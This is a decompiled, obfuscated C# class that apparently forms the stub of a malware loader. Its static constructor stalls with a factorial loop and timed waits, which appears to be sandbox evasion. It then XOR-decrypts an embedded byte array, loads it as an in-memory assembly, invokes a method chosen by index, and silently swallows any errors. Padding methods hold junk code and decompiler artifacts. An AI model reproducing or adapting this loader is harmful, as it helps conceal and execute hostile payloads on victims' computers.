using System;
using System.Numerics;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.Threading;
using ns1;

namespace ns0;

internal static class Class3
{
	internal delegate void Delegate0();

	public static byte[] byte_0;

	private static byte[] smethod_0(byte[] byte_1, int int_0)
	{
		for (int i = 0; i < byte_1.Length; i++)
		{
			byte_1[i] ^= (byte)(byte_0[i % byte_0.Length] ^ ((i + int_0 % byte_0.Length) & int_0));
		}
		return byte_1;
	}

	public static byte[] smethod_1(string string_0)
	{
		return SoapHexBinary.Parse(string_0).get_Value();
	}

	static Class3()
	{
		byte_0 = smethod_1("19");
		try
		{
			BigInteger bigInteger = new BigInteger(1);
			float num = 165f;
			for (int i = 1; (float)i <= num; i++)
			{
				bigInteger *= (BigInteger)i;
				new AutoResetEvent(initialState: false).WaitOne(i);
			}
			smethod_2();
		}
		catch
		{
		}
	}

	private static void Main()
	{
	}

	public static void smethod_2()
	{
		((Delegate0)Delegate.CreateDelegate(typeof(Delegate0), null, Thread.GetDomain().Load(smethod_0(PexXZio2pfTK1liwMDnWaEaYBqujujfxJ1hC.byte_0, 124)).GetTypes()[19].GetMethods()[0]))();
	}

	static void iqoyawipog0()
	{
	}

	unsafe static void ojukewoqodas1()
	{
		_ = (byte)smethod_1("NQVojOWPdOWziil+gnOiY0kGj5g05AwWRIPI1cJJN3QZDWthoBS3el7tyfkVfadDxUTN") != 0;
		bool flag = (byte)checked(1u - ((flag ? 1u : 0u) - 0u)) != 0;
		_ = (int)(flag ? ((bool*)1) : ((bool*)null))->ToString();
	}

	static void osepayedor2()
	{
	}

	static void osepayedor3()
	{
	}

	static void osepayedor4()
	{
	}

	static void osepayedor5()
	{
	}

	static void osepayedor6()
	{
	}

	static void osepayedor7()
	{
		//IL_0011: Expected O, but got I4
		_ = (ushort)lKpkLMkdt6Lv5ptxBDUN03w15FIu.Default;
		_ = Class0.Int32_0 is ushort;
	}

	static void osepayedor8()
	{
	}

	static void osepayedor9()
	{
	}
}
